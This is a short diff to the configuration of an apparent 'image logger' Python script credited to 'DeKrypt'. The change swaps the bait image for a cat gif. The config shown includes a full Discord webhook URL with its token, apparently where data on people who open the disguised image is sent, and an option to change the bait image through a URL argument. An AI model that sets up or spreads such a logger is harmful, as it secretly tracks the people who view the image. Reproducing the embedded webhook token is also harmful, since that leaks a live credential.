@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1521184592415953107/JETze9LHjHFLDhnoVFva6Nt-VyMsgqdjIpDzBXIoBbSpfn_TLYtAXYoN7-vhR51IsPCQ",
-    "image": "https://www.google.com/search?client=ms-android-xiaomi-terr1-rso2&sca_esv=890b852af12b1b22&sxsrf=AHTn8zokdBa_3zw8r6yAF5kJM18Mit4gPQ:1740160184603&q=uia+cat+meme+jpg", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/oia-uia-oia-cat-uia-cat-catcultclassics-gif-12805916815008299407", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
